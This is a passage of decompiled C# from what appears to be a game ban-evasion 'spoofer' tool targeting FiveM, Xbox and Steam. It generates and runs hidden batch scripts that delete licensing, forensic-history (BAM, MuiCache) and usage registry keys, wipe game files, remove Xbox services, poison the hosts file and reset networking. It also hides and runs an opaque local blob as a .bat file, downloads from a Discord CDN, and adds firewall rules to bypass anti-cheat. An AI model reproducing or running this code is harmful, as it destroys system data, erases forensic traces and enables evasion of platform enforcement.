						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\botan.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam_api64.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc STARCHARMS_SPOOFER");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\mods\\*.* ");
						streamWriter.WriteLine(":folderclean");
						streamWriter.WriteLine("call :getDiscordVersion");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("goto :xboxclean");
						streamWriter.WriteLine(": getDiscordVersion");
						streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
						streamWriter.WriteLine("     set 'varLoc =%%a'");
						streamWriter.WriteLine("   goto :d1");
						streamWriter.WriteLine(")");
						streamWriter.WriteLine(":d1");
						streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
						streamWriter.WriteLine("     set 'discordVersion =%%z'");
						streamWriter.WriteLine(")");
						streamWriter.WriteLine("goto :EOF");
						streamWriter.WriteLine(": xboxclean");
						streamWriter.WriteLine(" cls");
						streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
						streamWriter.WriteLine("sc stop XblAuthManager");
						streamWriter.WriteLine("sc stop XblGameSave");
						streamWriter.WriteLine("sc stop XboxNetApiSvc");
						streamWriter.WriteLine("sc stop XboxGipSvc");
						streamWriter.WriteLine("sc delete XblAuthManager");
						streamWriter.WriteLine("sc delete XblGameSave");
						streamWriter.WriteLine("sc delete XboxNetApiSvc");
						streamWriter.WriteLine("sc delete XboxGipSvc");
						streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
						streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
						streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
						streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
						streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
						streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("   rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s");
						streamWriter.WriteLine("exit");
						streamWriter.WriteLine("goto :eof");
					}
					Process process = Process.Start(text);
					process.WaitForExit();
					File.Delete(text);
					string path = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path))
					{
						Directory.CreateDirectory(path);
					}
					if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text2 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter2 = File.CreateText(text2))
						{
							streamWriter2.WriteLine("netsh int ip reset");
						}
						Process process2 = new Process();
						process2.StartInfo.FileName = text2;
						this.m_d.Add(process2);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process2.Start();
					}
					string text3 = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
					using (StreamWriter streamWriter3 = new StreamWriter(text3))
					{
						streamWriter3.WriteLine("echo off");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("taskkill /f /im Steam.exe /t");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("set hostspath=%windir%\\System32\\drivers\\etc\\hosts");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\steam_api64.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\DigitalEntitlements");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc LeanV2");
						streamWriter3.WriteLine("cls");
					}
					Process process3 = Process.Start(text3);
					process3.WaitForExit();
					File.Delete(text3);
					HWIDclick();
					XBOXclick();
					PCclick();
					Diskclick();
					FiveM();
					bi();
					string path2 = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path2))
					{
						Directory.CreateDirectory(path2);
					}
					if (File.Exists("C:\\Program Files\\Win64\\net.bat"))
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
						File.Delete("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text4 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter4 = File.CreateText(text4))
						{
							streamWriter4.WriteLine("netsh int ip reset");
						}
						Process process4 = new Process();
						process4.StartInfo.FileName = text4;
						this.m_d.Add(process4);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process4.Start();
						Thread.Sleep(500);
						File.Delete("C:\\Program Files\\Win64\\net.bat");
					}
					string tempPath = Path.GetTempPath();
					byte[] bytes =  File.ReadAllBytes("921776");
					File.WriteAllBytes(tempPath + this.m_c + ".bat", bytes);
					File.SetAttributes(tempPath + this.m_c + ".bat", FileAttributes.Hidden);
					Process.Start(tempPath + this.m_c + ".bat");
					Thread.Sleep(2500);
					xynwbyzia();
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
					string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					if (Directory.Exists(folderPath + "\\DigitalEntitlements"))
					{
						Directory.Delete(folderPath + "\\DigitalEntitlements", recursive: true);
					}
					if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\crashes"))
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\crashes", recursive: true);
					}
					if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\logs"))
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\logs", recursive: true);
					}
					if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\cache"))
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\data\\cache", recursive: true);
					}
					if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\citizen"))
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\citizen", recursive: true);
					}
					if (Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data"))
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\data", recursive: true);
					}
					Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\server-cache");
					if (Directory.Exists(folderPath2 + "\\CitizenFX"))
					{
						Directory.Delete(folderPath2 + "\\CitizenFX", recursive: true);
					}
					string path3 = "C:\\Program Files\\Win64";
					if (!Directory.Exists(path3))
					{
						Directory.CreateDirectory(path3);
					}
					if (File.Exists("C:\\Program Files\\Sounds\\fivemspoofed.wav"))
					{
						new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
					}
					else
					{
						string address = "https://cdn.discordapp.com/attachments/953684464104513571/959156445411180574/fivemspoofed.wav";
						string fileName = "C:\\Program Files\\Sounds\\fivemspoofed.wav";
						WebClient webClient = new WebClient();
						webClient.DownloadFile(address, fileName);
						File.SetAttributes("C:\\Program Files\\Sounds\\fivemspoofed.wav", FileAttributes.Hidden);
						new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
					}
					MessageBox.Show("FiveM Spoofed!", "Lean Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else if (this.m_aq.Text == "FiveM Bypass")
				{
					Hide();
					Process[] processesByName = Process.GetProcessesByName("FiveM");
					if (processesByName.Length != 0)
					{
						Process[] processesByName2 = Process.GetProcessesByName("FiveM");
						foreach (Process process5 in processesByName2)
						{
							process5.Kill();
						}
					}
					if (Directory.Exists("C:\\Program Files (x86)\\Blade Group"))
					{
						Directory.Delete("C:\\Program Files (x86)\\Blade Group");
						Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
					}
					Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
					Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					Process process6 = new Process();
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.FileName = "cmd.exe";
					processStartInfo.Arguments = "/C Start Explorer.exe fivem://connect/" + this.m_bx.Text;
					process6.StartInfo = processStartInfo;
					process6.Start();
					Process process7 = new Process();
					process7.StartInfo.FileName = "cmd.exe";
					process7.StartInfo.CreateNoWindow = true;
					process7.StartInfo.RedirectStandardInput = true;
					process7.StartInfo.RedirectStandardOutput = true;
					process7.StartInfo.UseShellExecute = false;
					process7.StartInfo.Verb = "runas";
					process7.StartInfo.Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= yes > nul";
					process7.Start();
					Hide();
					System.Timers.Timer timer = new System.Timers.Timer(50.0);
					timer.AutoReset = true;
					timer.Elapsed += MyMethod2;
					timer.Start();
				}
				else if (this.m_aq.Text == "Rust")
				{
					string tempPath2 = Path.GetTempPath();
					byte[] bytes2 = File.ReadAllBytes("203677");
					File.WriteAllBytes(tempPath2 + this.m_c + ".bat", bytes2);
